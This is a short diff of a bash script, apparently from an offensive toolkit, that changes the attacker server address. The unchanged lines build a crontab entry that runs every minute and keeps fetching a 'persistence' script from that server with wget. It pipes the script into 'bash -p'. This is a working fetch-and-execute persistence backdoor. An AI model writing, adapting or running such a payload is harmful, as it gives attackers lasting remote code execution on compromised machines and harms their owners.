@@ -1,6 +1,6 @@
 #!/bin/bash
 
-SERVER_HOST="10.2.45.121"
+SERVER_HOST="10.10.10.10"
 SERVER_PORT="11000" # static
 CURRENT_CRONTAB=$(crontab -l)
 PAYLOAD="\n* * * * * bash -c \"while [ 1 ]; do wget -qO- 'http://$SERVER_HOST:$PORT/persistence/cron/chattr/chattr.sh' | bash -p; sleep 2; done\""
